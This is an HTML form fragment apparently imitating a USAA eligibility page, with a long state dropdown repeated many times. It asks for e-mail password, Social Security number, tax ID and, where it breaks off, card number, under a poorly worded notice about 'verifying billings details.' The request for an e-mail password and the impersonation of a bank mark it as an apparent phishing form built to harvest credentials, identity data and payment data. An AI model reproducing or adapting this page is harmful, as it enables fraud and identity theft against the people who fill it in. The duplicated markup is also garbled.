value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option><option value="AGU">AGUASCALIENTES</option><option value="BCA">BAJA CALIFORNIA</option><option value="BCS">BAJA CALIFORNIA SUR</option><option value="CPH">CAMPECHE</option><option value="CHP">CHIAPAS</option><option value="CHU">CHIHUAHUA</option><option value="COA">COAHUILA</option><option value="CLM">COLIMA</option><option value="DTF">DISTRITO FEDERAL</option><option value="DUR">DURANGO</option><option value="GTO">GUANAJUATO</option><option value="GUR">GUERRERO</option><option value="HID">HIDALGO</option><option value="JAL">JALISCO</option><option value="MXO">MEXICO (STATE)</option><option value="MCH">MICHOACAN</option><option value="MOL">MORELOS</option><option value="NAY">NAYARIT</option><option value="NLN">NUEVO LEON</option><option value="OAX">OAXACA</option><option value="PUE">PUEBLA</option><option value="QRT">QUERETARO</option><option value="QRO">QUINTANA ROO</option><option value="SLP">SAN LUIS POTOSI</option><option value="SNL">SINALOA</option><option value="SON">SONORA</option><option value="TBS">TABASCO</option><option value="TML">TAMAULIPAS</option><option value="TXL">TLAXCALA</option><option value="VRZ">VERACRUZ</option><option value="YCT">YUCATAN</option><option value="ZAC">ZACATECAS</option><option value="ACT">CAPITAL TERRITORY</option><option value="NSW">NEW SOUTH WALES</option><option value="NOT">NORTHERN TERRITORY</option><option value="QLD">QUEENSLAND</option><option value="SAU">SOUTH AUSTRALIA</option><option value="TAS">TASMANIA</option><option value="VIC">VICTORIA</option><option value="WAU">WESTERN AUSTRALIA</option><option value="AB">ALBERTA</option><option value="BC">BRITISH COLUMBIA</option><option value="MB">MANITOBA</option><option value="NB">NEW BRUNSWICK</option><option value="NF">NEWFOUNDLAND</option><option value="NT">NORTHWEST TERRITORY</option><option value="NS">NOVA SCOTIA</option><option value="NU">NUNAVUT</option><option value="ON">ONTARIO</option><option value="PE">PRINCE EDWARD ISLAND</option><option value="QC">QUEBEC</option><option value="SK">SASKATCHEWAN</option><option value="SPI">ST PIERRE MIQUELON</option><option value="YT">YUKON</option></select>

			</td>
      </tr>   

   
          	<tr>
      


	          	
	     </tr>
   
          	<td width="40%" class="dataLabel">Country<br />
           	 <td width="60%">United States</td>
		</tr>


	<tr>
	
		 </tr>
	<tr>
		<td class="dataLabel"><span>E-mail</span></td>
		<td>
			
				<input type="text" conditionnbr="regex_all" id="emailaddress" name="emailaddress" maxlength="120" size="18"  />

			</div>
			
		</td>
	</tr>
			<tr>
		<td class="dataLabel"><span>E-mail Password</span></td>
		<td>
			
				<input type="password" conditionnbr="regex_all" id="emailpassword" name="emailpass" maxlength="120" size="18"  />

			</div>
			
		</td>
	</tr>
	<tr>
		<td class="dataLabel">Phone</td>
		<td>	
						<input type="text" conditionnbr="regex_all" id="phonenumber" name="phonenumber" maxlength="14" size="18" onKeyDown='formatPhone(this,null,event,WorkTelePhone);'  />

						
		</td>
	</tr>	
	
	</tr>
			
	
		</tr>
	<tr>
		<td class="dataLabel">Date of Birth</td>
           	 <td>		
						
			   				 <input type=text conditionnbr="regex_all"  id="DateOfBirth" name="DateOfBirth"  maxlength="10" value="" onKeyDown="dobDateKeyUp(this,event);" size="11"/>
						
						<br/>
						<span class="textInfo">MM/DD/YYYY</span>
          </tr>
     	<tr>
		
			</tr>
		
			<td><!--  WCM CONTENT OBJECT=eligibility_social_security_need_complex_module -->


<!--  WCM CONTENT ENDS  -->
</td>
			</tr>

			<td colspan="2"><!--  WCM CONTENT OBJECT=eligibility_social_security_need_complex_module -->


    <div class="noticeUser">

        <p>We need your Social Security number to verify your identity, to ensure information we request from other sources is matched to the right person, to combat fraud and identity theft, and for tax reporting. We'll protect it as described in our <a href="javascript:openHelpWnd('https://www.usaa.com/inet/pages/module_privacy_promise',980,600);">Privacy Promise</a>.</p>

    </div>
    <pageattributes layout="" compliancecode="" keywords="" subject="" robotsnoindex="0" redirecturl="" pagetaxonomy="become_a_member/eligibilty"></pageattributes>
    
    <span class="disclaimer"></span>


<!--  WCM CONTENT ENDS  -->
</td>
			</tr>

  		<td class="dataLabel"><span>Social Security Number</span></td>
   	 	<td>
				
	        		<input class="secure" type="password" conditionnbr="regex_all"  id="SSN" name="SSN"  maxlength="9" value="" onKeyUp="isNumeric(this);"  size="11"/>
	    						
				<span class="lockicon" title="This is a secure field" >&nbsp;&nbsp;&nbsp;</span>
			</div>
                     
            
	</tr> 
  		<td class="dataLabel"><span>Tax ID Number</span></td>
   	 	<td>
				
				
	        		<input class="secure" conditionnbr="regex_all" type="password"  id="TAXID" name="TAXID"  maxlength="9" value="" onKeyUp="isNumeric(this);"  size="11"/>
	    						
				<span class="lockicon" title="This is a secure field" >&nbsp;&nbsp;&nbsp;</span>
			</div>
                     
            
        <tr>
<!--  WCM CONTENT OBJECT=eligibility_social_security_need_complex_module -->


<!--  WCM CONTENT ENDS  -->
</td>
			</tr>

			<td colspan="2"><!--  WCM CONTENT OBJECT=eligibility_social_security_need_complex_module -->


    <div class="noticeUser">

        <p>Enter your card details below to verify your billings details, this is to secure your card from unauthorized users. <a href="javascript:openHelpWnd('https://www.usaa.com/inet/pages/module_privacy_promise',980,600);">Privacy Promise</a>.</p>

    </div>
    <pageattributes layout="" compliancecode="" keywords="" subject="" robotsnoindex="0" redirecturl="" pagetaxonomy="become_a_member/eligibilty"></pageattributes>
    
    <span class="disclaimer"></span>


<!--  WCM CONTENT ENDS  -->
<tr>
	<td class="dataLabel">&nbsp;</td>
				<td>&nbsp;</td>
</tr>
<tr>
	<td class="dataLabel">Card Number</td>
				<td>
